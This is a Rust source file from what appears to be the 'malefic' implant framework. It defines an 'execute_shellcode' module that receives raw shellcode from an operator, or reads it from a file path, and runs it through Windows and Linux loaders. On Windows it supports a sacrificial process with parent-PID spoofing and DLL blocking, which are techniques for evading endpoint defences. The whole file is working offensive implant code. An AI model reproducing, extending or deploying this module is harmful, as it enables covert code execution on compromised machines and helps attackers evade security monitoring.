#![allow(unused_assignments)]
use malefic_helper::common::utils::format_cmdline;
use malefic_proto::proto::modulepb::BinaryResponse;
use crate::prelude::*;

pub struct ExecuteShellcode {}

#[async_trait]
#[module_impl("execute_shellcode")]
impl Module for ExecuteShellcode {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for ExecuteShellcode {

    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let mut bin = request.bin;
        if bin.is_empty() && !request.path.is_empty() {
            bin = std::fs::read(&request.path)?;
        }
        let sacrifice = request.sacrifice;
        let params = request.args;
        let process_name = request.process_name;
        let mut is_need_sacrifice = false;
        let mut ppid = 0;
        let mut is_block_dll = false;
        let mut ret: Vec<u8> = Vec::new();
        let cmdline = format_cmdline(process_name, params);
        
        unsafe {
            if sacrifice.is_some() {
                let sacrifice = sacrifice.unwrap();
                is_need_sacrifice = true;
                ppid = sacrifice.ppid;
                is_block_dll = sacrifice.block_dll;
            }
            #[cfg(target_os = "windows")]
            {
                ret = to_error!(malefic_helper::win::loader::loader(
                    bin,
                    is_need_sacrifice,
                    cmdline.as_ptr() as _,
                    ppid,
                    is_block_dll,
                    request.output
                ))?;
            }
            #[cfg(target_os = "linux")]
            {
                ret = to_error!(malefic_helper::linux::loader::loader(
                    bin,
                    request.output
                ))?;
            }
        }

        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
            status: 0,
            message: Vec::new(),
            data: ret,
            err: "".to_string(),
        })))
    }

}